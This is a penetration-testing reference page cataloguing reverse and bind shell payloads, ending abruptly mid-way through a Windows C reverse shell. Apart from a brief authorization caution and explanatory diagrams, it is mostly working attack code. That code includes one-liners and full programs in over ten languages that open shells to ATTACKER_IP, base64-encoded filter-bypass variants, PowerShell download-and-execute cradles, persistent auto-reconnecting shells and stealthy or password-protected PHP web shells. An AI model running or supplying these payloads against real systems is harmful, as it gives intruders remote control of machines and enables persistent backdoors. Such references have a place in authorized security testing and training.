---
title: Reverse Shell & Bind Shell Payloads 
description: Master every reverse shell and bind shell technique — from one-liner payloads across 25+ languages to staged/stageless architecture, encrypted channels, evasion techniques, and real-world engagement workflows. The operator's definitive payload reference.
navigation:
  icon: i-lucide-terminal
  title: Reverse & Bind Shells
---

A shell is the **heartbeat** of every penetration test. Without a shell, you are just scanning. With a shell, you own the machine. Every exploit, every social engineering campaign, every attack chain — they all lead to one goal: **getting a shell on the target**.

This guide covers every technique, every language, every trick, and every mistake that separates a failed callback from a fully interactive root session.

::caution
All techniques in this guide are for **authorized penetration testing only**. Deploying shells on systems without explicit written permission is a criminal offense in every jurisdiction. The difference between a penetration tester and a criminal is a signed scope document. Keep yours handy.
::

## Understanding the Fundamentals

Before copying payloads, you need to understand **what** you are doing and **why** it works.

### Reverse Shell vs Bind Shell

::card-group
  ::card
  ---
  title: Reverse Shell
  icon: i-lucide-arrow-left
  ---
  The **target** connects back to **you**. The target initiates the outbound connection to your listener. This bypasses most firewalls because outbound connections are rarely blocked.

  **Direction:** Target → Attacker

  **When to use:** Almost always. This is the default choice for 95% of engagements.
  ::

  ::card
  ---
  title: Bind Shell
  icon: i-lucide-arrow-right
  ---
  The **target** opens a port and **listens** for your connection. You connect to the target. This requires the target's firewall to allow inbound connections on that port.

  **Direction:** Attacker → Target

  **When to use:** When you cannot receive inbound connections (restrictive NAT, no public IP) or when the target has permissive inbound firewall rules.
  ::
::

```text [Reverse Shell — Connection Flow]
┌──────────────┐                         ┌──────────────┐
│   ATTACKER   │                         │    TARGET    │
│              │                         │              │
│  Listener    │◄────── TCP Connection ──│  Payload     │
│  (nc -lvnp   │        INITIATED BY     │  executes &  │
│   4444)      │        TARGET           │  connects    │
│              │                         │  back to     │
│  Receives    │◄────── stdin/stdout ───▶│  attacker    │
│  shell I/O   │        bidirectional    │              │
└──────────────┘                         └──────────────┘

Firewall perspective:
  - Target firewall: ALLOWS outbound (almost always)
  - Attacker firewall: Must ALLOW inbound on listener port
```

```text [Bind Shell — Connection Flow]
┌──────────────┐                         ┌──────────────┐
│   ATTACKER   │                         │    TARGET    │
│              │                         │              │
│  Connects    │────── TCP Connection ──▶│  Listener    │
│  to target   │       INITIATED BY      │  (binds to   │
│  port 4444   │       ATTACKER          │   port 4444) │
│              │                         │              │
│  Receives    │◄────── stdin/stdout ───▶│  Serves      │
│  shell I/O   │        bidirectional    │  shell       │
└──────────────┘                         └──────────────┘

Firewall perspective:
  - Target firewall: Must ALLOW inbound on bind port
  - Attacker firewall: ALLOWS outbound (almost always)
```

### When to Use Which

| Scenario | Best Choice | Reason |
| -------- | ----------- | ------ |
| Standard pentest | Reverse Shell | Outbound connections bypass most firewalls |
| Target behind strict egress firewall | Bind Shell | If outbound is blocked, listen inbound |
| Attacker behind NAT (no port forward) | Bind Shell | You cannot receive inbound connections |
| Target behind NAT (no port forward) | Reverse Shell | Target initiates outbound, NAT handles it |
| Both behind NAT | Reverse Shell via public VPS | Listener on a VPS with public IP |
| Egress filtering by port | Reverse Shell on 443/80/53 | Use allowed outbound ports |
| Deep internal network (post-pivot) | Bind Shell | Simpler when you already have internal access |
| Stealth is priority | Reverse Shell over HTTPS/DNS | Encrypted or tunneled channels |

::tip
**Rule of thumb:** Try a reverse shell first. If it fails, the target's egress firewall is probably blocking it. Try different ports (443, 80, 53). If all fail, try a bind shell. If that fails too, you need to find an outbound channel that is allowed (HTTP, DNS, ICMP).
::

## Setting Up Listeners

Before any payload fires, your listener must be ready and waiting. A payload without a listener is a wasted exploit.

### Netcat Listener

The classic. Simple. Reliable. Available everywhere.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Basic Listener"}
  ```bash [Terminal]
  nc -lvnp 4444
  ```

  ::field-group
    ::field{name="-l" type="flag"}
    Listen mode. Netcat waits for incoming connections instead of initiating one.
    ::

    ::field{name="-v" type="flag"}
    Verbose. Shows connection details when a shell connects.
    ::

    ::field{name="-n" type="flag"}
    No DNS resolution. Faster connection handling. Avoids DNS leaks.
    ::

    ::field{name="-p 4444" type="flag"}
    Port to listen on. Choose a port that is not already in use.
    ::
  ::
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Persistent Listener"}
  Standard Netcat exits after the connection drops. Use a loop to auto-restart:

  ```bash [Terminal]
  while true; do nc -lvnp 4444; echo "[*] Connection lost. Restarting listener..."; sleep 1; done
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Bind Shell Connection"}
  When connecting TO a bind shell on the target:

  ```bash [Terminal]
  nc -nv 192.168.1.100 4444
  ```
  :::
::

### Ncat (Nmap's Netcat)

Ncat supports SSL, access control, and connection brokering — a massive upgrade over plain Netcat.

::code-group
  ```bash [Basic Listener]
  ncat -lvnp 4444
  ```

  ```bash [SSL Encrypted Listener]
  ncat --ssl -lvnp 4444
  ```

  ```bash [SSL with Certificate]
  # Generate self-signed cert
  openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

  # Start encrypted listener
  ncat --ssl --ssl-cert cert.pem --ssl-key key.pem -lvnp 4443
  ```

  ```bash [Allow Only Specific IP]
  ncat -lvnp 4444 --allow 192.168.1.100
  ```
::

::tip
**Always use encrypted listeners on real engagements.** Unencrypted shells transmit everything — commands, output, credentials — in plaintext. Any network monitoring between you and the target will capture it all. SSL/TLS listeners prevent this.
::

### Socat Listener

Socat is the Swiss Army knife of network connections. More complex syntax but infinitely more powerful.

::code-group
  ```bash [Basic Listener]
  socat TCP-LISTEN:4444,reuseaddr,fork STDOUT
  ```

  ```bash [Full Interactive TTY Listener]
  socat file:`tty`,raw,echo=0 TCP-LISTEN:4444
  ```

  ```bash [SSL Encrypted Listener]
  # Generate cert
  openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
  cat shell.key shell.crt > shell.pem

  # Start SSL listener
  socat OPENSSL-LISTEN:4443,cert=shell.pem,verify=0,reuseaddr,fork EXEC:/bin/bash
  ```
::

### Metasploit Multi/Handler

The most versatile listener. Handles staged payloads, encryption, and session management.

```bash [msf6>]
use exploit/multi/handler
set PAYLOAD <payload_type>
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
set AutoRunScript "post/multi/manage/shell_to_meterpreter"
exploit -j
```

::accordion
  :::accordion-item{icon="i-lucide-settings" label="Handler for Common Payload Types"}
  ```bash [Reverse TCP (Staged)]
  use exploit/multi/handler
  set PAYLOAD windows/x64/meterpreter/reverse_tcp
  set LHOST 0.0.0.0
  set LPORT 4444
  exploit -j
  ```

  ```bash [Reverse TCP (Stageless)]
  use exploit/multi/handler
  set PAYLOAD windows/x64/meterpreter_reverse_tcp
  set LHOST 0.0.0.0
  set LPORT 4444
  exploit -j
  ```

  ```bash [Reverse HTTPS (Encrypted)]
  use exploit/multi/handler
  set PAYLOAD windows/x64/meterpreter/reverse_https
  set LHOST 0.0.0.0
  set LPORT 443
  set HttpUserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
  exploit -j
  ```

  ```bash [Linux Reverse Shell]
  use exploit/multi/handler
  set PAYLOAD linux/x64/shell/reverse_tcp
  set LHOST 0.0.0.0
  set LPORT 4444
  exploit -j
  ```

  ```bash [PHP Reverse Shell]
  use exploit/multi/handler
  set PAYLOAD php/meterpreter/reverse_tcp
  set LHOST 0.0.0.0
  set LPORT 4444
  exploit -j
  ```
  :::

  :::accordion-item{icon="i-lucide-layers" label="Running Multiple Handlers"}
  ```bash [msf6>]
  # Handler 1: Standard reverse TCP
  use exploit/multi/handler
  set PAYLOAD windows/x64/meterpreter/reverse_tcp
  set LHOST 0.0.0.0
  set LPORT 4444
  set ExitOnSession false
  exploit -j

  # Handler 2: HTTPS on 443
  use exploit/multi/handler
  set PAYLOAD windows/x64/meterpreter/reverse_https
  set LHOST 0.0.0.0
  set LPORT 443
  set ExitOnSession false
  exploit -j

  # Handler 3: Linux shells
  use exploit/multi/handler
  set PAYLOAD linux/x64/shell/reverse_tcp
  set LHOST 0.0.0.0
  set LPORT 5555
  set ExitOnSession false
  exploit -j

  # List running handlers
  jobs -l
  ```
  :::
::

### Listener Comparison Matrix

| Listener | SSL Support | Staged Payloads | Auto-Restart | Session Mgmt | Complexity |
| -------- | ----------- | --------------- | ------------ | ------------ | ---------- |
| Netcat (`nc`) | :icon{name="i-lucide-x"} No | :icon{name="i-lucide-x"} No | :icon{name="i-lucide-x"} No | :icon{name="i-lucide-x"} No | Trivial |
| Ncat | :icon{name="i-lucide-check"} Yes | :icon{name="i-lucide-x"} No | :icon{name="i-lucide-x"} No | :icon{name="i-lucide-x"} No | Low |
| Socat | :icon{name="i-lucide-check"} Yes | :icon{name="i-lucide-x"} No | :icon{name="i-lucide-check"} Fork | :icon{name="i-lucide-x"} No | Medium |
| Metasploit | :icon{name="i-lucide-check"} Yes | :icon{name="i-lucide-check"} Yes | :icon{name="i-lucide-check"} Yes | :icon{name="i-lucide-check"} Yes | Medium |
| Pwncat | :icon{name="i-lucide-check"} Yes | :icon{name="i-lucide-x"} No | :icon{name="i-lucide-check"} Yes | :icon{name="i-lucide-check"} Yes | Medium |

## Reverse Shell Payloads — The Complete Collection

This is the arsenal. Every language, every variant, every situation.

::warning
Replace `ATTACKER_IP` with your actual IP address and `PORT` with your listener port in every payload below. Using `0.0.0.0` or `127.0.0.1` as ATTACKER_IP will not work — the target needs to reach YOUR machine.
::

### Bash / Shell

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Reverse Shells"}
  ```bash [Bash TCP (Most Common)]
  bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
  ```

  ```bash [Bash TCP (Alternative)]
  bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
  ```

  ```bash [Bash UDP]
  bash -i >& /dev/udp/ATTACKER_IP/4444 0>&1
  ```

  ```bash [Bash with exec]
  exec 5<>/dev/tcp/ATTACKER_IP/4444; cat <&5 | while read line; do $line 2>&5 >&5; done
  ```

  ```bash [Bash exec (Full Redirect)]
  0<&196;exec 196<>/dev/tcp/ATTACKER_IP/4444; sh <&196 >&196 2>&196
  ```

  ```bash [Base64 Encoded (Bypass Filters)]
  echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" | base64
  # Copy the output, then on target:
  echo "YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC80NDQ0IDA+JjE=" | base64 -d | bash
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Bind Shells"}
  ```bash [Bash Bind Shell]
  bash -c 'while true; do nc -lvnp 4444 -e /bin/bash; done'
  ```

  ```bash [Bash Bind (No -e Flag)]
  rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -lvnp 4444 > /tmp/f
  ```
  :::
::

::note
The bash `/dev/tcp` reverse shell is the **most commonly used** payload in CTFs and real engagements. Memorize it: `bash -i >& /dev/tcp/IP/PORT 0>&1`. It uses bash's built-in `/dev/tcp` device file — no external tools required.
::

### Netcat

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Reverse Shells"}
  ```bash [Netcat -e (Traditional)]
  nc -e /bin/bash ATTACKER_IP 4444
  ```

  ```bash [Netcat -c (Alternative)]
  nc -c /bin/bash ATTACKER_IP 4444
  ```

  ```bash [Netcat without -e (OpenBSD nc)]
  rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f
  ```

  ```bash [Netcat without -e (Alternative)]
  rm /tmp/f; mkfifo /tmp/f; nc ATTACKER_IP 4444 0</tmp/f | /bin/sh > /tmp/f 2>&1
  ```

  ```bash [Ncat SSL Reverse]
  ncat --ssl ATTACKER_IP 4443 -e /bin/bash
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Bind Shells"}
  ```bash [Netcat Bind -e]
  nc -lvnp 4444 -e /bin/bash
  ```

  ```bash [Netcat Bind (No -e)]
  rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -lvnp 4444 > /tmp/f
  ```

  ```bash [Ncat SSL Bind]
  ncat --ssl --ssl-cert cert.pem --ssl-key key.pem -lvnp 4443 -e /bin/bash
  ```
  :::
::

::tip
**Which Netcat version is installed?** This determines which flags work:
- **GNU Netcat** — supports `-e` and `-c` flags
- **OpenBSD Netcat** — does NOT support `-e`. Use the `mkfifo` variant instead
- **Ncat (Nmap)** — supports `-e`, `--ssl`, and more
- **BusyBox Netcat** — limited flags, varies by build

Check with: `nc -h 2>&1 | head -5` or `which nc && nc --version`
::

### Python

The most versatile reverse shell language. Available on almost every Linux system and many Windows machines.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Reverse Shells"}
  ```python [Python 3 Reverse Shell (Short)]
  python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
  ```

  ```python [Python 3 Reverse Shell (Readable)]
  python3 -c '
  import socket,subprocess,os
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect(("ATTACKER_IP", 4444))
  os.dup2(s.fileno(), 0)
  os.dup2(s.fileno(), 1)
  os.dup2(s.fileno(), 2)
  subprocess.call(["/bin/sh", "-i"])
  '
  ```

  ```python [Python 3 with PTY (Better Shell)]
  python3 -c '
  import socket,subprocess,os,pty
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect(("ATTACKER_IP", 4444))
  os.dup2(s.fileno(), 0)
  os.dup2(s.fileno(), 1)
  os.dup2(s.fileno(), 2)
  pty.spawn("/bin/bash")
  '
  ```

  ```python [Python 2 (Legacy Systems)]
  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
  ```

  ```python [Windows Python Reverse Shell]
  python3 -c '
  import socket,subprocess
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect(("ATTACKER_IP", 4444))
  while True:
      data = s.recv(1024).decode()
      if data.lower().strip() == "exit": break
      proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
      output = proc.stdout.read() + proc.stderr.read()
      s.send(output)
  s.close()
  '
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Bind Shells"}
  ```python [Python 3 Bind Shell]
  python3 -c '
  import socket,subprocess,os
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  s.bind(("0.0.0.0", 4444))
  s.listen(1)
  conn, addr = s.accept()
  os.dup2(conn.fileno(), 0)
  os.dup2(conn.fileno(), 1)
  os.dup2(conn.fileno(), 2)
  subprocess.call(["/bin/sh", "-i"])
  '
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Advanced Python"}
  ```python [Encrypted Reverse Shell (SSL)]
  python3 -c '
  import socket,subprocess,os,ssl
  context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
  context.check_hostname = False
  context.verify_mode = ssl.CERT_NONE
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  ss = context.wrap_socket(s)
  ss.connect(("ATTACKER_IP", 4443))
  os.dup2(ss.fileno(), 0)
  os.dup2(ss.fileno(), 1)
  os.dup2(ss.fileno(), 2)
  subprocess.call(["/bin/bash", "-i"])
  '
  ```

  ```python [Auto-Reconnecting Reverse Shell]
  python3 -c '
  import socket,subprocess,os,time
  while True:
      try:
          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          s.connect(("ATTACKER_IP", 4444))
          os.dup2(s.fileno(), 0)
          os.dup2(s.fileno(), 1)
          os.dup2(s.fileno(), 2)
          subprocess.call(["/bin/bash", "-i"])
      except:
          time.sleep(30)
          continue
  '
  ```
  :::
::

### PHP

The language of web shells. If the target runs PHP, this is your entry point.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Reverse Shells"}
  ```php [PHP exec Reverse Shell]
  php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
  ```

  ```php [PHP proc_open Reverse Shell]
  php -r '$sock=fsockopen("ATTACKER_IP",4444);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'
  ```

  ```php [PHP shell_exec Reverse Shell]
  php -r '$sock=fsockopen("ATTACKER_IP",4444);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
  ```

  ```php [PHP system Reverse Shell]
  php -r '$sock=fsockopen("ATTACKER_IP",4444);`/bin/sh -i <&3 >&3 2>&3`;'
  ```

  ```php [PHP Reverse Shell (Full — Web Upload)]
  <?php
  set_time_limit(0);
  $ip = 'ATTACKER_IP';
  $port = 4444;
  $chunk_size = 1400;
  $shell = '/bin/sh -i';

  $sock = fsockopen($ip, $port, $errno, $errstr, 30);
  if (!$sock) { exit(1); }

  $descriptorspec = array(
      0 => array("pipe", "r"),
      1 => array("pipe", "w"),
      2 => array("pipe", "w")
  );

  $process = proc_open($shell, $descriptorspec, $pipes);
  if (!is_resource($process)) { exit(1); }

  stream_set_blocking($pipes[0], 0);
  stream_set_blocking($pipes[1], 0);
  stream_set_blocking($pipes[2], 0);
  stream_set_blocking($sock, 0);

  while (1) {
      if (feof($sock) || feof($pipes[1])) { break; }
      $read_a = array($sock, $pipes[1], $pipes[2]);
      $write_a = NULL;
      $error_a = NULL;
      $num_changed_sockets = stream_select($read_a, $write_a, $error_a, NULL);
      if (in_array($sock, $read_a)) {
          $input = fread($sock, $chunk_size);
          fwrite($pipes[0], $input);
      }
      if (in_array($pipes[1], $read_a)) {
          $output = fread($pipes[1], $chunk_size);
          fwrite($sock, $output);
      }
      if (in_array($pipes[2], $read_a)) {
          $output = fread($pipes[2], $chunk_size);
          fwrite($sock, $output);
      }
  }

  fclose($sock);
  fclose($pipes[0]);
  fclose($pipes[1]);
  fclose($pipes[2]);
  proc_close($process);
  ?>
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Bind Shells"}
  ```php [PHP Bind Shell]
  php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",4444);socket_listen($s,1);$cl=socket_accept($s);while(1){socket_write($cl,"$ ");$in=socket_read($cl,1024);$cmd=popen($in,"r");while(!feof($cmd)){$out=fgets($cmd);socket_write($cl,$out);}}'
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Web Shells"}
  ```php [Simple Web Shell (cmd parameter)]
  <?php echo system($_GET['cmd']); ?>
  ```

  ```php [Stealthy Web Shell (POST only)]
  <?php if(isset($_POST['c'])){echo '<pre>'.shell_exec($_POST['c']).'</pre>';} ?>
  ```

  ```php [Password-Protected Web Shell]
  <?php
  if($_POST['key'] !== 'sup3rs3cr3t') die('404');
  echo '<pre>'.shell_exec($_POST['cmd']).'</pre>';
  ?>
  ```

  ```php [Eval Web Shell (Bypass keyword filters)]
  <?php @eval($_REQUEST['e']); ?>
  ```

  ```php [Base64 Encoded Execution]
  <?php echo shell_exec(base64_decode($_GET['c'])); ?>
  ```
  :::
::

::warning
**PHP function availability varies!** Many production PHP configurations disable dangerous functions in `php.ini`:

```ini [php.ini]
disable_functions = exec, passthru, shell_exec, system, proc_open, popen
```

If your payload fails, check which functions are available. Use `phpinfo()` or try functions in this order: `system()` → `exec()` → `shell_exec()` → `passthru()` → `proc_open()` → `popen()` → backtick operator.
::

### PowerShell

The primary shell for Windows targets. Built into every modern Windows installation.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Reverse Shells"}
  ```powershell [PowerShell TCP Reverse Shell (One-Liner)]
  powershell -nop -ep bypass -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
  ```

  ```powershell [PowerShell Base64 Encoded]
  # Step 1: Create the payload
  $payload = '$c=New-Object Net.Sockets.TCPClient("ATTACKER_IP",4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+"PS "+(pwd).Path+"> ";$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()'

  # Step 2: Encode it
  $bytes = [Text.Encoding]::Unicode.GetBytes($payload)
  $encoded = [Convert]::ToBase64String($bytes)

  # Step 3: Execute on target
  powershell -nop -ep bypass -enc $encoded
  ```

  ```powershell [PowerShell Invoke-Expression (Download Cradle)]
  powershell -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"
  ```

  ```powershell [PowerShell via cmd.exe]
  cmd /c powershell -nop -ep bypass -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)};$c.Close()"
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Bind Shells"}
  ```powershell [PowerShell TCP Bind Shell]
  powershell -nop -ep bypass -c "$l=New-Object Net.Sockets.TcpListener([Net.IPAddress]::Any,4444);$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)};$l.Stop()"
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Advanced PowerShell"}
  ```powershell [ConPTY Reverse Shell (Full Interactive)]
  IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing)
  Invoke-ConPtyShell -RemoteIp ATTACKER_IP -RemotePort 4444 -Rows 40 -Cols 120
  ```

  ```powershell [Powercat (PowerShell Netcat)]
  # Download powercat
  IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/powercat.ps1')

  # Reverse shell
  powercat -c ATTACKER_IP -p 4444 -e cmd.exe

  # Bind shell
  powercat -l -p 4444 -e cmd.exe

  # Reverse shell with encryption
  powercat -c ATTACKER_IP -p 4444 -e cmd.exe -ssl
  ```
  :::
::

### Perl

Old but still present on many Unix systems, especially legacy infrastructure.

::code-group
  ```perl [Perl Reverse Shell]
  perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
  ```

  ```perl [Perl Reverse Shell (Alternative)]
  perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"ATTACKER_IP:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
  ```

  ```perl [Perl Bind Shell]
  perl -MIO -e '$s=new IO::Socket::INET(LocalPort,4444,Listen,1,Reuse,1);while($c=$s->accept()){$~->fdopen($c,w);STDIN->fdopen($c,r);system$_ while<>}'
  ```
::

### Ruby

::code-group
  ```ruby [Ruby Reverse Shell]
  ruby -rsocket -e 'f=TCPSocket.open("ATTACKER_IP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
  ```

  ```ruby [Ruby Reverse Shell (Alternative)]
  ruby -rsocket -e 'exit if fork;c=TCPSocket.new("ATTACKER_IP","4444");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/444444444444/ ? IO.popen($_,"r"){|io|c.print io.read} : (c.print `#{$_}`) rescue nil)}'
  ```

  ```ruby [Ruby Bind Shell]
  ruby -rsocket -e 's=TCPServer.new("0.0.0.0",4444);c=s.accept;while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
  ```
::

### Node.js / JavaScript

::code-group
  ```javascript [Node.js Reverse Shell]
  require('child_process').exec('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1')
  ```

  ```javascript [Node.js Reverse Shell (Full)]
  (function(){
      var net = require("net"),
          cp = require("child_process"),
          sh = cp.spawn("/bin/sh", []);
      var client = new net.Socket();
      client.connect(4444, "ATTACKER_IP", function(){
          client.pipe(sh.stdin);
          sh.stdout.pipe(client);
          sh.stderr.pipe(client);
      });
      return /a/;
  })();
  ```

  ```javascript [Node.js Bind Shell]
  (function(){
      var net = require("net"),
          cp = require("child_process"),
          sh = cp.spawn("/bin/sh", []);
      var server = net.createServer(function(client){
          client.pipe(sh.stdin);
          sh.stdout.pipe(client);
          sh.stderr.pipe(client);
      });
      server.listen(4444);
  })();
  ```

  ```javascript [Node.js Windows Reverse Shell]
  (function(){
      var net = require("net"),
          cp = require("child_process"),
          sh = cp.spawn("cmd.exe", []);
      var client = new net.Socket();
      client.connect(4444, "ATTACKER_IP", function(){
          client.pipe(sh.stdin);
          sh.stdout.pipe(client);
          sh.stderr.pipe(client);
      });
      return /a/;
  })();
  ```
::

### Java

::code-group
  ```java [Java Reverse Shell (Runtime)]
  Runtime r = Runtime.getRuntime();
  Process p = r.exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'");
  p.waitFor();
  ```

  ```java [Java Reverse Shell (One-Liner for Injection)]
  {Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}")}
  ```

  ```java [Groovy Reverse Shell (Jenkins)]
  String host = "ATTACKER_IP";
  int port = 4444;
  String cmd = "/bin/bash";
  Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
  Socket s = new Socket(host, port);
  InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
  OutputStream po = p.getOutputStream(), so = s.getOutputStream();
  while(!s.isClosed()) {
      while(pi.available()>0) so.write(pi.read());
      while(pe.available()>0) so.write(pe.read());
      while(si.available()>0) po.write(si.read());
      so.flush(); po.flush(); Thread.sleep(50);
      try { p.exitValue(); break; } catch (Exception e) {}
  }
  p.destroy(); s.close();
  ```
::

### C / C++

For compiled payloads that leave no interpreter dependencies.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Linux Reverse Shell"}
  ```c [reverse_shell.c]
  #include <stdio.h>
  #include <sys/socket.h>
  #include <netinet/in.h>
  #include <arpa/inet.h>
  #include <unistd.h>

  int main() {
      int sock;
      struct sockaddr_in addr;

      addr.sin_family = AF_INET;
      addr.sin_port = htons(4444);
      addr.sin_addr.s_addr = inet_addr("ATTACKER_IP");

      sock = socket(AF_INET, SOCK_STREAM, 0);
      connect(sock, (struct sockaddr *)&addr, sizeof(addr));

      dup2(sock, 0);  // stdin
      dup2(sock, 1);  // stdout
      dup2(sock, 2);  // stderr

      execve("/bin/sh", NULL, NULL);
      return 0;
  }
  ```

  ```bash [Compile]
  gcc reverse_shell.c -o reverse_shell
  # Static linking (no dependencies on target)
  gcc reverse_shell.c -o reverse_shell -static
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Linux Bind Shell"}
  ```c [bind_shell.c]
  #include <stdio.h>
  #include <sys/socket.h>
  #include <netinet/in.h>
  #include <unistd.h>

  int main() {
      int srv, cli;
      struct sockaddr_in addr;

      addr.sin_family = AF_INET;
      addr.sin_port = htons(4444);
      addr.sin_addr.s_addr = INADDR_ANY;

      srv = socket(AF_INET, SOCK_STREAM, 0);
      int opt = 1;
      setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
      bind(srv, (struct sockaddr *)&addr, sizeof(addr));
      listen(srv, 1);

      cli = accept(srv, NULL, NULL);

      dup2(cli, 0);
      dup2(cli, 1);
      dup2(cli, 2);

      execve("/bin/sh", NULL, NULL);
      return 0;
  }
  ```

  ```bash [Compile]
  gcc bind_shell.c -o bind_shell -static
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Windows Reverse Shell"}
  ```c [win_reverse.c]
  #include <winsock2.h>
  #include <stdio.h>
  #pragma comment(lib, "ws2_32")

  int main() {
      WSADATA wsa;
      SOCKET sock;
      struct sockaddr_in addr;
      STARTUPINFO si;
      PROCESS_INFORMATION pi;

      WSAStartup(MAKEWORD(2,2), &wsa);
      sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

      addr.sin_family = AF_INET;
      addr.sin_port = htons(4444);
      addr.sin_addr.s_addr = inet_addr("ATTACKER_IP");

      WSAConnect(sock, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL);

      memset(&si, 0, sizeof(si));
      si.cb = sizeof(si);
      si.dwFlags = STARTF_USESTDHANDLES;
